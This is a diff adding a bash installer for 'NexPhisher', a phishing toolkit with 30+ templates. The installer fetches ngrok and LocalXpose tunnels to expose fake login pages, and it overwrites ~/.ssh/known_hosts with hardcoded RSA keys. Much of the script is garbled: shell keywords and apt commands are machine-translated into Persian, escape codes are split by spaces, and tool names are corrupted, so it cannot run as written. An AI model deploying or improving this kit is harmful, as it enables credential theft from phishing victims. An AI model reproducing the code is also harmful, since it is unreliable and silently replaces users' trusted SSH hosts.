@@ -1,0 +1,114 @@
+#!/bin/bash
+
+بنر () {
+روشن
+printf "\ e [0m \ n"
+printf "\ e [0m \ e [92m _ _ \ e [0m \ e [93m _____ _ _ _ \ e [0m \ n"
+printf "\ e [0m \ e [92m | \ | | \ e [0m \ e [93m | __ \ | | (_) | | \ e [0m \ n"
+printf "\ e [0m \ e [92m | \ | | _____ __ \ e [0m \ e [93m | | __) | | __ _ ___ | | __ ___ _ __ \ e [0m \ n"
+printf "\ e [0m \ e [92m |. | / _ \ \ / / \ e [0m \ e [93m | ___ / | _ \ | / __ | _ \ / _ \ __ | \ e [0m \ n "
+printf "\ e [0m \ e [92m | | \ | __/> <\ e [0m \ e [93m | | | | | | \ __ \ | | | __/ | \ e [0m \ n"
+printf "\ e [0m \ e [92m | _ | \ _ | \ ___/_/\ _ _ \ \ e [0m \ e [93m | _ | | | | | | | | ___/_ | | _ | \ ___ | _ | \ e [0m \ e [1؛ 44m [V 1.0] \ e [0m \ n "
+printf "\ e [0m \ n"
+printf "\ e [0m \ e [1؛ 41m ابزار پیشرفته فیشینگ با 30+ الگو [بر اساس: HTR-TECH] \ e [0m \ n"
+printf "\ e [0m \ n"
+}
+بنر
+printf "\ e [0m \ n"
+printf "\ e [0m \ e [1؛ 91m [\ e [1؛ 97m ~ \ e [1؛ 91m] \ e [1؛ 93m نصب بسته ها .... \ e [0m \ n"
+printf "\ e [0m \ n"
+apt-get update
+apt -get upgrade -y
+apt -get -y ssh را نصب کنید
+apt -get -y curl را نصب کنید
+apt -get -y php را نصب کنید
+apt -get -y را از حالت فشرده خارج کنید
+apt-get -y سرور opensh-server را نصب کنید
+printf "\ e [0m \ n"
+printf "\ e [0m \ e [1؛ 91m [\ e [1؛ 97m ~ \ e [1؛ 91m] \ e [1؛ 93m راه اندازی محیط .... \ e [0m \ n"
+اگر [[-d .htr]] ؛ سپس
+printf ""
+دیگری
+mkdir .htr
+fi
+اگر [[-d logs]] ؛ سپس
+printf ""
+دیگری
+mkdir سیاهههای مربوط
+fi
+اگر [[-e Modules.zip]] ؛ سپس
+unzip -qq Modules.zip
+rm Modules.zip
+fi
+اگر [[-e .htr/گرمk]] ؛ سپس
+printf ""
+دیگری
+arch = $ (uname -a | grep -o 'arm' | head -n1)
+arch2 = $ (uname -a | grep -o 'Android' | head -n1)
+اگر [[$ arch == * 'بازو' *]] || [[$ arch2 == * 'Android' *]]؛ سپس
+curl -LO https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip>/dev/null 2> & 1
+اگر [[-e ngrok-stable-linux-arm.zip]] ؛ سپس
+unzip گرمk-stable-linux-arm.zip> /dev /null 2> & 1
+mv ngrok .htr
+rm -rf ngrok-stable-linux-arm.zip
+chmod +x .htr/ngrok
+دیگری
+printf "\ n \ e [1؛ 31m [\ e [0m \ e [1؛ 77m! \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 93m خطا \ e [1؛ 31m [\ e [0m \ e [1؛ 77m! \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 96m به صورت دستی Ngrok را نصب کنید. \ e [0m \ n "
+خروج 1
+fi
+دیگری
+curl -LO https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip>/dev/null 2> & 1 
+if [[-e ngrok-stable-linux-386.zip]] ؛ سپس
+unzip گرمk-stable-linux-386.zip> /dev /null 2> & 1
+mv ngrok .htr
+rm -rf ngrok-stable-linux-386.zip
+chmod +x .htr/ngrok
+دیگری
+printf "\ n \ e [1؛ 31m [\ e [0m \ e [1؛ 77m! \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 93m خطا \ e [1؛ 31m [\ e [0m \ e [1؛ 77m! \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 96m به صورت دستی Ngrok را نصب کنید. \ e [0m \ n "
+خروج 1
+fi
+fi
+fi
+اگر [[-e .htr/loclx]] ؛ سپس
+printf ""
+دیگری
+archa = $ (uname -a | grep -o 'arm' | head -n1)
+arch2a = $ (uname -a | grep -o 'Android' | head -n1)
+if [[$ archa == * 'arm' *]] || [[$ arch2a == * 'Android' *]]؛ سپس
+curl -LO https://lxpdownloads.sgp1.digitaloceanspaces.com/cli/loclx-linux-arm.zip>/dev/null 2> & 1
+اگر [[-e loclx-linux-arm.zip]] ؛ سپس
+فشرده سازی loclx-linux-arm.zip> /dev /null 2> & 1
+mv loclx .htr
+rm -rf loclx-linux-arm.zip
+chmod +x .htr/loclx
+دیگری
+printf "\ n \ e [1؛ 31m [\ e [0m \ e [1؛ 77m! \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 93m خطا \ e [1؛ 31m [\ e [0m \ e [1؛ 77m! \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 96m Install LocalXpose Manual. \ e [0m \ n "
+خروج 1
+fi
+دیگری
+curl -LO https://lxpdownloads.sgp1.digitaloceanspaces.com/cli/loclx-linux-386.zip>/dev/null 2> & 1 
+اگر [[-e loclx-linux-386.zip]] ؛ سپس
+فشرده سازی loclx-linux-386.zip> /dev /null 2> & 1
+mv loclx .htr
+rm -rf loclx-linux-386.zip
+chmod +x .htr/loclx
+دیگری
+printf "\ n \ e [1؛ 31m [\ e [0m \ e [1؛ 77m! \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 93m خطا \ e [1؛ 31m [\ e [0m \ e [1؛ 77m! \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 96m Install LocalXpose Manual. \ e [0m \ n "
+خروج 1
+fi
+fi
+fi
+اگر [[-d ~/.ssh]] ؛ سپس
+printf ""
+دیگری
+mkdir ~/.ssh
+fi
+chmod +x nexphisher
+printf "| 1 | SVjtt9mtL4P / 5lsqaielF1pJHvM = | 6QmJXxfPd9A5uUaFI1RV2H4brTs = SSH-RSA AAAAB3NzaC1yc2EAAAADAQABAAABAQC3lJnhW1oCXuAYV9IBdcJA + Vx7AHL5S / ZQvV2fhceOAPgO2kNQZla6xvUwoE4iw8lYu3zoE1KtieCU9yInWOVI6W / wFaT / ETH1tn55T2FVsK / zaxPiHZVJGLPPdEEid0vS2p1JDfc9onZ0pNSHLl1QusIOeMUyZ2bUMMLLgw46KOT9S3s / LmxgoJ3PocVUn5rVXz / Dng7Y8jYNe4IFrZOAUsi7hNBa + OYja6ceefpDvNDEJ1BdhbYfGolBdNA7f + FNl0kfaWru4Cblr843wBe2ckO / sNqgeAMXO / QH + SSgQxUXF2AgAw + TGp3yCIyYoOPvOgvcPsQziJLmDbUuQpnH است \ n | 1 | PiraXMKgzzt9DdPRSLAtRvRad0Y = | 2W162QXfHJvKKZWIaRyZO6VFWJI = ssh-rsaAAAAB3NzaC1yc2EAAAADAQABAAABAQC3lJnhW1oCXuAYV9IBdcJA + Vx7AHL5S / ZQvV2fhceOAPgO2kNQZla6xvUwoE4iw8lYu3zoE1KtieCU9yInWOVI6W / wFaT / ETH1tn55T2FVsK / zaxPiHZVJGLPPdEEid0vS2p1JDfc9onZ0pNSHLl1QusIOeMUyZ2bUMMLLgw46KOT9S3s / LmxgoJ3PocVUn5rVXz / Dng7Y8jYNe4IFrZOAUsi7hNBa + OYja6ceefpDvNDEJ1BdhbYfGolBdNA7f + FNl0kfaWru4Cblr843wBe2ckO / sNqgeAMXO / QH + SSgQxUXF2AgAw + TGp3yCIyYoOPvOgvcPsQziJLmDbUuQpnH را \ n "> ~ / .ssh / known_hosts
+printf "\ e [0m \ n"
+printf "\ e [0m \ e [1؛ 91m [\ e [1؛ 97m ~ \ e [1؛ 91m] \ e [1؛ 93m نصب و راه اندازی به پایان رسید !! \ e [0m \ n"
+printf "\ e [0m \ n"
+خوابیدن 2
+printf "\ e [0m \ e [1؛ 91m [\ e [1؛ 97m ~ \ e [1؛ 91m] \ e [1؛ 93m Type \ e [1؛ 96mbash nexphisher \ e [1؛ 93m برای اجرای NEXPHISHER! ! \ e [0m \ n "
+printf "\ e [0m \ n"
+printf "\ e [0m \ n"
